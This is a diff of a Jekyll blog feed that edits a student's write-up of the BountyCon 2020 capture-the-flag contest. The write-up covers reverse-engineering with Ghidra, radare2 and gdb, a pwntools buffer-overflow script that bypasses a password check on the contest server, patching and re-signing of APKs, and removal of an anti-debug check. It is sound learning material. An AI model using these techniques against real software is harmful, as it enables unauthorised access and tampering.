@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-09T07:46:08-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Home</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Facebook BountyCon 2020 Writeup</title><link href="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html" rel="alternate" type="text/html" title="Facebook BountyCon 2020 Writeup" /><published>2020-03-03T21:44:46-08:00</published><updated>2020-03-03T21:44:46-08:00</updated><id>http://localhost:4000/blog/2020/03/03/BountyCon-2020</id><content type="html" xml:base="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html">&lt;p&gt;This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-03-14T10:15:17-07:00</updated><id>/feed.xml</id><title type="html">Home</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Facebook BountyCon 2020 Write-up</title><link href="/blog/2020/03/03/BountyCon-2020.html" rel="alternate" type="text/html" title="Facebook BountyCon 2020 Write-up" /><published>2020-03-03T21:44:46-08:00</published><updated>2020-03-03T21:44:46-08:00</updated><id>/blog/2020/03/03/BountyCon-2020</id><content type="html" xml:base="/blog/2020/03/03/BountyCon-2020.html">&lt;p&gt;This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.&lt;/p&gt;
 
-&lt;p&gt;Before coming to the right solutions to the challenges. I tried a lot of different ways to solve the challenges. Below are the solutions that I used to solve the challenges.&lt;/p&gt;
+&lt;p&gt;Before coming to the right solution to the challenges. I tried a lot of different ways to solve the challenges. Below are the solutions that I used to solve the challenges.&lt;/p&gt;
 &lt;h1 id=&quot;secure-login&quot;&gt;Secure Login&lt;/h1&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;We developed a super secure login system, but unfortunately, we aren't familiar with those newfangled memory-safe languages.
 
@@ -9,9 +9,10 @@ nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000
 secure_login.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Starting from the 1st Challange which had a description stated above.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/files/secure_login.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;As server &lt;code class=&quot;highlighter-rouge&quot;&gt;ec2-3-11-37-224.eu-west-2.compute.amazonaws.com&lt;/code&gt; is listening, we have to connect it using &lt;code class=&quot;highlighter-rouge&quot;&gt;nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000&lt;/code&gt; command. On connecting, it prompts for the password which we don’t know and somehow, we have to bypass it to get the flag.&lt;/p&gt;
+&lt;p&gt;Starting from the first challange which had a description stated above.
+As server &lt;code class=&quot;highlighter-rouge&quot;&gt;ec2-3-11-37-224.eu-west-2.compute.amazonaws.com&lt;/code&gt; is listening, we have to connect it using &lt;code class=&quot;highlighter-rouge&quot;&gt;nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000&lt;/code&gt; command. On connecting, it prompts for the password which we don’t know and somehow, we have to bypass it to get the flag.&lt;/p&gt;
 
 &lt;p&gt;The file which was running on their server was given to us. So, I quickly ran that file on my local machine and connected to it using “nc localhost 10000”, and again it prompted for the password.
 I started debugging it using Ghidra (a free and open-source reverse engineering tool developed by the National Security Agency). After opening the file with Ghidra and decompiling ASM to C code, there was a function &lt;code class=&quot;highlighter-rouge&quot;&gt;check_passwd&lt;/code&gt; which was responsible for the password validation.
@@ -80,8 +81,8 @@ The function looked something like this:&lt;/p&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;The line &lt;code class=&quot;highlighter-rouge&quot;&gt;sVar2 = read(param_1,&amp;amp;local_b8,0x90);&lt;/code&gt; is reading 144 characters from the user and saving it to local_b8.
-line &lt;code class=&quot;highlighter-rouge&quot;&gt;MD5((uchar *)&amp;amp;local_b8,0x80,local_28);&lt;/code&gt; doing MD5 of 128 characters taken from user and saving to local_28.
-line &lt;code class=&quot;highlighter-rouge&quot;&gt;iVar1 = memcmp(local_28,&amp;amp;local_38,0x10);&lt;/code&gt;  comparing 0x10(16 in decimal) bytes of two blocks local_28 and local_38(as local_38 is of only 8 bytes, the value of local_30 will also be compared) of memory.Both local_38 and local_30 are defined in the code with precomputed md5. 
+Line &lt;code class=&quot;highlighter-rouge&quot;&gt;MD5((uchar *)&amp;amp;local_b8,0x80,local_28);&lt;/code&gt; doing MD5 of 128 characters taken from user and saving to local_28.
+Line &lt;code class=&quot;highlighter-rouge&quot;&gt;iVar1 = memcmp(local_28,&amp;amp;local_38,0x10);&lt;/code&gt;  comparing 0x10(16 in decimal) bytes of two blocks local_28 and local_38(as local_38 is of only 8 bytes, the value of local_30 will also be compared) of memory. Both local_38 and local_30 are defined in the code with precomputed MD5. 
 If the comparison is true it will print the flag. As MD5 is a one-way function, it is difficult to know the input.&lt;/p&gt;
 
 &lt;p&gt;As local_b8 is of 8 bytes, BufferOverflow will happen when users write password of 144 characters and it will overwrite all the  variables till local_30 variable.&lt;/p&gt;
@@ -108,7 +109,7 @@ undefined8 local_30;
 Now, the Solution is pretty straight forward. Enter some garbage data of 128 characters + MD5 hash of it. So,128 + 16(MD5 hash) = 144. The program will compute the MD5 hash of the first 128 characters and will compare it with the next 16 characters(local_38 and local_30) which were overwritten by us.&lt;/p&gt;
 
 &lt;p&gt;Below is the script that i used.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python2
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python2
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ec2-3-11-37-224.eu-west-2.compute.amazonaws.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Password: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -142,12 +143,14 @@ Now, the Solution is pretty straight forward. Enter some garbage data of 128 cha
 shake_it.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After extracting the file, there was an apk file in it. I quickly installed that apk file to my mobile. and a screen like below opened.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/files/shake_it.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;After extracting the file, there was an apk file in it. I quickly installed that apk file to my mobile and a screen like below opened.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It said &lt;code class=&quot;highlighter-rouge&quot;&gt;Start shaking&lt;/code&gt;
-So when I shook it, the text changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;999999 Shakes to go&lt;/code&gt; which meant we have to shake it &lt;code class=&quot;highlighter-rouge&quot;&gt;999999&lt;/code&gt; times to get the flag. Since this number is too huge, we have to patch the apk file. Here, I decompiled the apk file using &lt;code class=&quot;highlighter-rouge&quot;&gt;Jadx&lt;/code&gt; to view the java code. The flag wasn’t in the apk file, it was stored in an encrypted form in the &lt;code class=&quot;highlighter-rouge&quot;&gt;native-lib.so&lt;/code&gt; file.
+so when I shook it, the text changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;999999 Shakes to go&lt;/code&gt; which meant we have to shake it &lt;code class=&quot;highlighter-rouge&quot;&gt;999999&lt;/code&gt; times to get the flag. Since this number is too huge, we have to patch the apk file. Here, I decompiled the apk file using &lt;code class=&quot;highlighter-rouge&quot;&gt;Jadx&lt;/code&gt; to view the java code. The flag wasn’t in the apk file, it was stored in an encrypted form in the &lt;code class=&quot;highlighter-rouge&quot;&gt;native-lib.so&lt;/code&gt; file.
 In the mainactivity class, I found the following code:&lt;/p&gt;
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onSensorChanged&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SensorEvent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sensorEvent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sensorEvent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sensor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
@@ -183,18 +186,18 @@ In the mainactivity class, I found the following code:&lt;/p&gt;
         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;if we change the &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; condition in &lt;code class=&quot;highlighter-rouge&quot;&gt;if (this.shakes &amp;lt; 10000000)&lt;/code&gt; then we can have our flag. For this, I used apktool to patch the file.
+&lt;p&gt;If we change the &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; condition in &lt;code class=&quot;highlighter-rouge&quot;&gt;if (this.shakes &amp;lt; 10000000)&lt;/code&gt; then we can have our flag. For this, I used apktool to patch the file.
 I decompiled file using apktool &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool -d &quot;shake_it.apk&lt;/code&gt; and in the &lt;code class=&quot;highlighter-rouge&quot;&gt;shake_it/smali/com/example/myapplication/MainActivity.smali&lt;/code&gt;, I changed the if condition by changing &lt;code class=&quot;highlighter-rouge&quot;&gt;if-gez v7, :cond_0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;if-lez v7, :cond_0&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Untitled.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Build the apk file again using &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool b &quot;shake_it&quot; -o &quot;shake_it1.apk&quot;&lt;/code&gt;.If you install a newly created apk file you will get a certificate error. So we have to sign the apk file. For this, First, create a key using keytool &lt;code class=&quot;highlighter-rouge&quot;&gt;keytool -v -genkey -keystore shake_it1.keystore -alias shake_it1 -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 356&lt;/code&gt;. Enter anything in the fields&lt;/p&gt;
+&lt;p&gt;Build the apk file again using &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool b &quot;shake_it&quot; -o &quot;shake_it1.apk&quot;&lt;/code&gt;.If you install a newly created apk file you will get a certificate error. So we have to sign the apk file. For this, create a key using keytool &lt;code class=&quot;highlighter-rouge&quot;&gt;keytool -v -genkey -keystore shake_it1.keystore -alias shake_it1 -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 356&lt;/code&gt;. Enter anything in the fields.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_34.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;then, Sign the application using jarsigner &lt;code class=&quot;highlighter-rouge&quot;&gt;jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;then, sign the application using jarsigner &lt;code class=&quot;highlighter-rouge&quot;&gt;jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_35.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -217,20 +220,22 @@ Note: ensure you grant the app camera permissions.
 lighthouse.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;p&gt;&lt;a href=&quot;/files/lighthouse.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
+
 &lt;p&gt;After extracting the file, there was an apk file in it. On installing that apk file to my mobile there was a screen with a single button. When I pressed the button flash started to turn on and off.&lt;/p&gt;
 
 &lt;p&gt;I decompiled the apk file using &lt;code class=&quot;highlighter-rouge&quot;&gt;Jadx&lt;/code&gt; to view the java code.
 From the code what I understood was that the code was containing the morse codes map to alpha codes. On each character of morse code (“.”, “-“ , “ “) flash will be turned off or on for some time defined in the code, and from the flash, you have to get the morse code and from the morse code you have to get the alpha character which will make the flag, but the flash was turning off and on too quickly that a human can’t handle it.&lt;/p&gt;
 
-&lt;p&gt;After analyzing a bit further I realized that the flag was encrypted in the same form and in the same file(libnative-lib.so) as in “Shake It” Challenge. So, I replaced the “libnative-lib.so” of lighthouse to shake it “libnative-lib.so” file, then an installed apk file and shake it to get the file.&lt;/p&gt;
+&lt;p&gt;After analyzing a bit further I realized that the flag was encrypted in the same form and in the same file(libnative-lib.so) as in “Shake It” challenge. So, I replaced the “libnative-lib.so” of lighthouse to shake it “libnative-lib.so” file, then an installed apk file and shake it to get the file.&lt;/p&gt;
 
-&lt;p&gt;I decompiled file using apktool &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool -d &quot;shake_it.apk&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool -d &quot;lighthouse.apk&lt;/code&gt;. In the &lt;code class=&quot;highlighter-rouge&quot;&gt;shake_it/lib/&lt;/code&gt; replace all the files/folders including &lt;code class=&quot;highlighter-rouge&quot;&gt;libnative-lib.so&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;lighthouse/lib/&lt;/code&gt; files of lighthouse.(Just simply copy all folder of &lt;code class=&quot;highlighter-rouge&quot;&gt;lighthouse/lib/&lt;/code&gt; and paste them to &lt;code class=&quot;highlighter-rouge&quot;&gt;shake_it/lib/&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;I decompiled file using apktool &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool -d &quot;shake_it.apk&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool -d &quot;lighthouse.apk&lt;/code&gt;. In the &lt;code class=&quot;highlighter-rouge&quot;&gt;shake_it/lib/&lt;/code&gt; replace all the files/folders including &lt;code class=&quot;highlighter-rouge&quot;&gt;libnative-lib.so&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;lighthouse/lib/&lt;/code&gt; files of lighthouse(just simply copy all folder of &lt;code class=&quot;highlighter-rouge&quot;&gt;lighthouse/lib/&lt;/code&gt; and paste them to &lt;code class=&quot;highlighter-rouge&quot;&gt;shake_it/lib/&lt;/code&gt;).&lt;/p&gt;
 
 &lt;p&gt;Build the apk file again using &lt;code class=&quot;highlighter-rouge&quot;&gt;apktool b &quot;shake_it&quot; -o &quot;shake_it1.apk&quot;&lt;/code&gt;.If you install a newly created apk file you will get a certificate error. Hence, sign the apk file. For this run; first, create a key using keytool &lt;code class=&quot;highlighter-rouge&quot;&gt;keytool -v -genkey -keystore shake_it1.keystore -alias shake_it1 -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 356&lt;/code&gt;. Enter anything in the fields.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_34.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;then, Sign the application using jarsigner &lt;code class=&quot;highlighter-rouge&quot;&gt;jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;then, sign the application using jarsigner &lt;code class=&quot;highlighter-rouge&quot;&gt;jarsigner -keystore shake_it1.keystore -sigalg SHA1withRSA -digestalg SHA1 shake_it1.apk shake_it1&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_35.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -251,6 +256,8 @@ From the code what I understood was that the code was containing the morse codes
 
 anti_what.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;/files/anti_what.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Running the file will print &lt;code class=&quot;highlighter-rouge&quot;&gt;Press any key to quit&lt;/code&gt;
 I used Ghidra to decompile the file. After opening the file with Ghidra and decompiling ASM to C code. Main Function looked something like this&lt;/p&gt;
@@ -304,7 +311,7 @@ I used Ghidra to decompile the file. After opening the file with Ghidra and deco
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RC4_set_key((RC4_KEY *)local_118,0x32,key);&lt;/code&gt; was getting the key for RC4.
-&lt;code class=&quot;highlighter-rouge&quot;&gt;RC4((RC4_KEY *)local_118,0x4e,ptext,ptext);&lt;/code&gt; was decrypting the ptext using RC4&lt;/p&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;RC4((RC4_KEY *)local_118,0x4e,ptext,ptext);&lt;/code&gt; was decrypting the ptext using RC4.&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runPayload();&lt;/code&gt; has the following code.&lt;/p&gt;
 
@@ -319,8 +326,7 @@ I used Ghidra to decompile the file. After opening the file with Ghidra and deco
   return;
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;line &lt;code class=&quot;highlighter-rouge&quot;&gt;(*(code *)puVar1)(); &lt;/code&gt; looks strange. Here it is calling some method
-, so lets check what it is calling.&lt;/p&gt;
+&lt;p&gt;Line &lt;code class=&quot;highlighter-rouge&quot;&gt;(*(code *)puVar1)();&lt;/code&gt; looks strange. Here it is calling some method, so lets check what it is calling.&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lVar2 = ptrace(PTRACE_TRACEME,0,1,0);&lt;/code&gt; of main function checking if debugger is attached or not.
 So, Running the file with the debugger attached will delete the file. For this, we have to patch the file. I did it using &lt;code class=&quot;highlighter-rouge&quot;&gt;radare2&lt;/code&gt;&lt;/p&gt;
@@ -329,20 +335,20 @@ s 0x158f // Address on which we want to change the instruction
 wa jmp 0x15a8 //change je to jmp
 quit 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;use &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump anti_what -d&lt;/code&gt; to check if changes are made or not. Look at 0x158f address&lt;/p&gt;
+&lt;p&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump anti_what -d&lt;/code&gt; to check if changes are made or not. Look at 0x158f address&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Untitled1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_4.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;now,&lt;/p&gt;
+&lt;p&gt;Now,&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb ./anti_what
 break runPayload // to check what's going on runPayload
 r
 disas
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;set breakpoint after line “call *%rdx”.In my case it is.&lt;/p&gt;
+&lt;p&gt;Set breakpoint after line “call *%rdx”. In my case it is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000555555555554f1&lt;/code&gt;&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;break *0x0000555555555554f1
 x/s $rdx
@@ -367,6 +373,8 @@ x/s $rdx
 ghidra_is_cool.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;p&gt;&lt;a href=&quot;/files/ghidra_is_cool.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
+
 &lt;p&gt;It was the simplest one I guess. After extracting the file and running the file it printed nothing.
 &lt;code class=&quot;highlighter-rouge&quot;&gt;strings ghidra_is_cool&lt;/code&gt;
 shows string &lt;code class=&quot;highlighter-rouge&quot;&gt;patch me!&lt;/code&gt; in the file
@@ -374,8 +382,8 @@ I used Ghidra to decompile the file. Code looked like this&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_5.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;address 0x00401063 contains &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSCALL&lt;/code&gt; (looks interesting).
-I patch the file by changing program to jmp 0x0040101a&lt;/p&gt;
+&lt;p&gt;Address 0x00401063 contains &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSCALL&lt;/code&gt; (looks interesting).
+I patch the file by changing program to jmp at 0x0040101a so that SYSCALL get executed.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -w ./ghidra_is_cool
 s 0x401000
 wa jmp 0x0040101a
@@ -403,20 +411,21 @@ Note: the flag format for this challenge is bountycon-...
 meggenser.tar.gz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After extracting the file and running the apk file. the following screen containing emoji opened. It had nothing just emoji to send and delete the message.
-So, I analyzed the apk with gdb ,apktool, and Jadx.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/files/meggenser.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;After extracting the file and running the apk file. The following screen containing emoji opened. It had nothing just emoji to send and delete the message.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_6.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Pressing any emoji text will appear as something like “:abc-abc-abc:”. Flag format for this challenge is bountycon-… as given in the details of the task. so the flag should be like “:bountycon-abc-abc:” and text will convert to some sort of emoji.&lt;/p&gt;
+&lt;p&gt;Pressing any emoji text will appear as something like “:abc-abc-abc:”. Flag format for this challenge is bountycon-… as given in the details of the task. The flag should be like “:bountycon-abc-abc:” and text will convert to some sort of emoji.&lt;/p&gt;
 
-&lt;p&gt;After checking the JAVA code of apk file. There was nonthing interesting in the apk file. Everything was done in &lt;code class=&quot;highlighter-rouge&quot;&gt;libparse.so&lt;/code&gt; file. So, I started to debug it.&lt;/p&gt;
+&lt;p&gt;After checking the JAVA code(decompiled using Jadx) of apk file. There was nonthing interesting in the apk file. Everything was done in &lt;code class=&quot;highlighter-rouge&quot;&gt;libparse.so&lt;/code&gt; file. So, I started to debug it.&lt;/p&gt;
 
 &lt;p&gt;After analyzing it a lot with GDB,apktool, and Jadx, I came to a situation where each character of an entered text going to a specific if condition. When a character is right if the condition will get true else not.&lt;/p&gt;
 
-&lt;p&gt;so I just bruteforce the flag by holding the if condition.&lt;/p&gt;
+&lt;p&gt;So, I just bruteforce the flag by holding the if condition.&lt;/p&gt;
 
-&lt;p&gt;In function &lt;code class=&quot;highlighter-rouge&quot;&gt;Java_com_facebook_bountycon2020_app_Emojifier_parse&lt;/code&gt;.there is one if condition like below&lt;/p&gt;
+&lt;p&gt;In function &lt;code class=&quot;highlighter-rouge&quot;&gt;Java_com_facebook_bountycon2020_app_Emojifier_parse&lt;/code&gt;. There is one if condition like below&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (((cVar3 != '-') &amp;amp;&amp;amp;
   (((local_3c = (char *)0xffffffa0, 0x19 &amp;lt; (byte)(cVar3 + 0x9fU) &amp;amp;&amp;amp;
     (local_3c = (char *)0xffffffeb, 9 &amp;lt; (byte)(cVar3 - 0x30U))) ||
@@ -424,9 +433,9 @@ So, I analyzed the apk with gdb ,apktool, and Jadx.&lt;/p&gt;
  (piVar11 = (int *)piVar11[(int)(pcVar7 + 1)], piVar11 == (int *)0x0)) goto LAB_00010c33;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;whatever you enter the right character of the flag.Above if the condition will be true.&lt;/p&gt;
+&lt;p&gt;Whatever you enter the right character of the flag. Above if the condition will be true.&lt;/p&gt;
 
-&lt;p&gt;Install the apk file by &lt;code class=&quot;highlighter-rouge&quot;&gt;adb install meggenser.apk&lt;/code&gt;.I used genymotion for the emulator.&lt;/p&gt;
+&lt;p&gt;Install the apk file by &lt;code class=&quot;highlighter-rouge&quot;&gt;adb install meggenser.apk&lt;/code&gt;. I used genymotion for the emulator.&lt;/p&gt;
 
 &lt;p&gt;Connect meggenser app to gdb to debug it.&lt;/p&gt;
 
@@ -440,16 +449,16 @@ break Java_com_facebook_bountycon2020_app_Emojifier_parse
 c
 # Enter any input from app.
 disas
-#place breakpoint anywhere in the if condition.In my case,it is address 0xe39alccf
+#Place breakpoint anywhere in the if condition. In my case, it is address 0xe39alccf
 break *0xe39alccf
-del 1 # to delete the first breakpoint.
+del 1 # To delete the first breakpoint.
 # Enter :bountycon-a: as flag for this challenge starts with bountycon-...
-c 10 # length of &quot;bountycon-&quot; is 10 if message prints on the app then a is wrong guess.
+c 10 # length of &quot;bountycon-&quot; is 10 if message prints on the app then it is a wrong guess.
 # Enter :bountycon-3:
-c 10 # gdb will be on breakpoint under the if condition as input is correct so 3 is the right input towards the flag.
